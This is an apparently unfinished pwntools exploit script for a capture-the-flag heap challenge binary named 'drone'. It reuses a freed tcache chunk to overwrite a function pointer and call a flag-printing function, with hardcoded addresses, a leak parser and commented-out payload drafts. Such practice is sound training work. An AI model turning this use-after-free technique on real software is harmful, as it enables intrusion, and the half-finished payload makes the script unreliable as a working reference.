#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("drone")

#b *start_drone_route+104
#b enter_drone_route
gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)


"""
pwndbg> ptype struct Drone
type = struct Drone {
    int id;
    char *status;
    void (*start_route)(struct Drone *);
    void (*end_route)(struct Drone *);
}
"""





# Plan:
# When we make a drone and and retire it, the memory will be stored in the tcache and not consolidated
# with the top chunk. Our plan is to make 2 drones, delete the first one, then ask to make a drone route
# which will give us the memory that once was drone1 and then we can edit this to overflow into drone 2.
# then we will overflow the id parameter of drone 2 and call start_drone_route. The id parameter of drone 2
# has to be the addres of the function print_drone_manual() which will give us the flag.
# This is because start_drone_route will call the id as a function pointer


# Make drone 1
# Make drone 2

# Addresses
# kig videre i stat_drone_route TODO
print_drone_manual = 0x400836
status = 0x400da0
route_end = 0x4008b8

# Functions

def create_drone():
    io.sendline(b"1")
    io.recvuntil(b"Choose an option: ")

def delete_drone(drone_id):
    io.sendline(b"2")
    io.recv()
    io.sendline(f"{drone_id}".encode())
    io.recvuntil(b"Choose an option: ")

def make_drone_route(data):
    io.sendline(b"4")
    io.recv()
    io.sendline(data)
    io.recvuntil(b"Choose an option: ")

def start_drone_route(drone_id):
    io.sendline(b"3")
    io.recvline(b"Enter drone ID to start its route: ")
    io.sendline(f"{drone_id}".encode())
    io.recvuntil(b"Choose an option: ")



io = start()

# Setting ready for function calls
io.recv()


# make a drone and send on route to break in gdb
create_drone()
create_drone()

delete_drone(2)
delete_drone(1)


# Make a route that resembles a drone (fake drone)
io.sendline(b"4")
recv = io.recvline()
print(recv)
memory = int(recv[len(recv)-10:].strip().ljust(8,b"\x00"), 16)
log.info("Got addr: %s" % hex(memory))
io.recv()


# Construct the fake drone
#p = p64(0x01) # id = 3 because it will be the 3rd drone allocated and the counter is not decremented when a drone is deleted
#p += p64(status) # keep status same
#p += p64(route_end) # keep route end
#p += p64(print_drone_manual) # start route is replaced with print_drone_manual
#p += p64(0x30) # overwrite the malloc metadata size field so that it seems that prev-in-use is not set (prev is our fake data)
#p += p64(0) # first part of malloc metadata: keep 0
#p += p64(memory) # make the tcache point to the start of our fake chunk metadata
#p += p64(0)
#p += p64(0)
#p += p64(0)
#p += p64(0)


p = p64(0x0) 
p += p64(0x0) 
p += p64(0x0)
p += p64(0x4)
#p += p64(0x0)
#p += p64(0x31) # t cache keeps prev in use
#p += p64(memory)
##p += b"AAAAAAA" #7 A's because there is a one of error on the 7th 8-byte string
#p += b"\x00"*7
#p += p64(0x604)
#p += p64(memory) # point tcache to our fake drone chunk
"""
p = b"AAAAAAAA"
p += b"BBBBBBBB"
p += b"CCCCCCCC"
p += b"DDDDDDDD"
p += b"EEEEEEEE"
p += b"FFFFFFFF"
p += b"GGGGGGGG"
p += b"HHHHHHHH"
p += b"IIIIIIII"
p += b"JJJJJJJJ"
"""

# Send fake drone data
io.sendline(p)

#create_drone()


io.interactive()
